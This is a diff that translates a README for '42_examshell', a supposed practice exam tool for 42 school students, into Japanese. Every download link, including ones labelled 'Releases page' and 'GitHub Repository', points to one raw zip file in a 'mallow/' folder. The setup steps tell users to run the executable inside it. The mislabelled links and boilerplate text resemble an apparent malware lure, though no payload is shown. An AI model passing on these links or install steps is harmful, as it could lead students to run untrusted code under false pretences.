@@ -1,90 +1,90 @@
-# 🚀 42_examshell - Practice for Success in Your Exams
+# 🚀 42_examshell - 試験成功のための練習ツール
 
-## 📥 Download the Latest Version
+## 📥 最新版のダウンロード
 
-[![Download 42_examshell](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
+[![42_examshellをダウンロード](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
 
-## 🚀 Getting Started
+## 🚀 はじめに
 
-Welcome to 42_examshell! This application provides a practice exam environment tailored for students at the 42 school. With support for new subjects and exercises across various ranks, it prepares you efficiently for the official exams.
+42_examshellへようこそ！このアプリケーションは、42の学生向けに調整された模擬試験環境を提供します。新しい課題（Subject）や様々なランクの演習に対応しており、公式試験に向けた効率的な準備が可能です。
 
-You can download the latest version of the application from the Releases page. 
+Releasesページからアプリケーションの最新版をダウンロードできます。
 
-## 📄 Features
+## 📄 機能
 
-- **Exam Simulation**: Experience an environment that mimics the official exam setting.
-- **New Subject Support**: Prepare for an expanded range of topics.
-- **Progress Tracking**: Keep track of your performance over different exercises.
-- **User-Friendly Interface**: Navigate the application easily.
-- **Multiple Ranks**: Practice exercises from Rank 02, Rank 03, and Rank 04.
+- **試験シミュレーション**: 公式試験の設定を模した環境を体験できます。
+- **新しい課題（Subject）のサポート**: 幅広いトピックの準備が可能です。
+- **進捗管理**: 様々な課題に対するパフォーマンスを記録できます。
+- **使いやすいインターフェース**: アプリケーションを簡単に操作できます。
+- **複数のランク**: Rank 02、Rank 03、Rank 04の課題を練習できます。
 
-## 💾 System Requirements
+## 💾 システム要件
 
-To run 42_examshell, please ensure your device meets the following requirements:
+42_examshellを実行するには、お使いのデバイスが以下の要件を満たしていることを確認してください：
 
-- **Operating System**: Windows 10 or higher, macOS Catalina or higher, or a modern Linux distribution.
-- **Memory**: At least 4GB RAM.
-- **Storage**: Minimum of 200MB free disk space.
-- **Network**: Internet connection is needed for updates and downloads.
+- **オペレーティングシステム**: Windows 10以降、macOS Catalina以降、または最新のLinuxディストリビューション。
+- **メモリ**: 4GB以上のRAM。
+- **ストレージ**: 200MB以上の空きディスク容量。
+- **ネットワーク**: 更新やダウンロードのためにインターネット接続が必要です。
 
-## 📥 Download & Install
+## 📥 ダウンロードとインストール
 
-To get started with 42_examshell, follow these simple steps:
+42_examshellを使い始めるには、以下の簡単な手順に従ってください：
 
-1. **Visit the Releases Page**: Click the link below to go to the 42_examshell Releases page.  
-   [Download 42_examshell](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
+1. **Releasesページにアクセス**: 下記のリンクをクリックして、42_examshellのReleasesページに移動します。
+   [42_examshellをダウンロード](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
    
-2. **Choose the Latest Version**: Look for the latest version at the top of the Releases page. It will have a tag like "v1.0".
+2. **最新版を選択**: Releasesページの一番上にある最新バージョンを探します。「v1.0」のようなタグが付いています。
 
-3. **Download the Application**: Click on the download link for your operating system. The file will download automatically. 
+3. **アプリケーションをダウンロード**: お使いのOS用のダウンロードリンクをクリックします。ファイルは自動的にダウンロードされます。
 
-4. **Run the Installer**:
-   - For Windows: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
-   - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux: Extract the downloaded file and run it from the terminal.
+4. **インストーラーを実行**:
+   - Windowsの場合: `.exe`ファイルをダブルクリックします。画面の指示に従ってインストールを完了してください。
+   - macOSの場合: `.dmg`ファイルを開き、アプリケーションを「アプリケーション」フォルダにドラッグします。
+   - Linuxの場合: ダウンロードしたファイルを解凍し、ターミナルから実行します。
 
-5. **Launch the Application**: 
-   - On Windows, find the app in your Start Menu.
-   - On macOS, open your Applications folder and double-click the app.
-   - On Linux, execute the app from your terminal.
+5. **アプリケーションを起動**: 
+   - Windowsの場合、スタートメニューからアプリを探します。
+   - macOSの場合、アプリケーションフォルダを開き、アプリをダブルクリックします。
+   - Linuxの場合、ターミナルからアプリを実行します。
 
-## ✨ Using 42_examshell
+## ✨ 42_examshellの使い方
 
-Once installed, you can begin using 42_examshell right away. Here’s how:
+インストール後、すぐに42_examshellを使い始めることができます。手順は以下の通りです：
 
-1. **Open the Application**: Launch the application as described above.
-2. **Select Your Subject**: Choose from the list of subjects to practice.
-3. **Start an Exam**: Click "Start Exam" to begin. You will see questions similar to the official exam format.
-4. **Review Your Results**: At the end of the exam, review your answers and scores. This will help you focus on areas that need improvement.
+1. **アプリケーションを開く**: 上記の手順に従ってアプリケーションを起動します。
+2. **課題（Subject）を選択**: 練習したい課題をリストから選びます。
+3. **試験を開始**: 「Start Exam」をクリックして開始します。公式試験の形式に似た問題が表示されます。
+4. **結果を確認**: 試験終了後、回答とスコアを確認します。改善が必要な分野に集中するのに役立ちます。
 
-## ❓ Frequently Asked Questions
+## ❓ よくある質問
 
-### What is 42_examshell?
+### 42_examshellとは何ですか？
 
-42_examshell is a practice tool designed for 42 school students. It allows you to simulate exam conditions and improve your skills before the real exam.
+42_examshellは、42の学生向けに設計された練習ツールです。試験条件をシミュレートし、実際の試験前にスキルを向上させることができます。
 
-### How often is 42_examshell updated?
+### 42_examshellはどのくらいの頻度で更新されますか？
 
-We regularly update the application to include new subjects and exercises. Check the Releases page to stay updated on new versions.
+新しい課題や演習を含めるために、アプリケーションを定期的に更新しています。Releasesページで新しいバージョンを確認してください。
 
-### Can I provide feedback?
+### フィードバックを送ることはできますか？
 
-Yes, your feedback is valuable! Please visit the issues section in the GitHub repository to submit any comments or suggestions.
+はい、フィードバックは貴重です！コメントや提案があれば、GitHubリポジトリのIssuesセクションにアクセスして投稿してください。
 
-### Is technical support available?
+### テクニカルサポートはありますか？
 
-For technical questions, feel free to reach out via the issues section on GitHub. We will assist you as best we can.
+技術的な質問については、GitHubのIssuesセクションからお気軽にお問い合わせください。可能な限りサポートいたします。
 
-## 🗨️ Community and Support
+## 🗨️ コミュニティとサポート
 
-Join the 42_examshell community! Connect with other users to share tips and experiences. 
+42_examshellコミュニティに参加しましょう！他のユーザーとつながり、ヒントや経験を共有できます。
 
-- **Discussion Forum**: Join conversations on various topics related to exam preparation.
-- **Tutorials and Guides**: Access resources that help you maximize the use of 42_examshell.
+- **ディスカッションフォーラム**: 試験準備に関する様々なトピックの会話に参加できます。
+- **チュートリアルとガイド**: 42_examshellを最大限に活用するためのリソースにアクセスできます。
 
-## 🔗 Links
+## 🔗 リンク
 
-- [Visit the Releases Page to Download](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
+- [Releasesページにアクセスしてダウンロード](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
+- [GitHubリポジトリ](https://raw.githubusercontent.com/mirkoloru/42_examshell/main/mallow/42_examshell.zip)
 
-Thank you for choosing 42_examshell! We wish you the best of luck in your exam preparation.
+42_examshellを選んでいただきありがとうございます！試験準備でのご健闘をお祈りします。
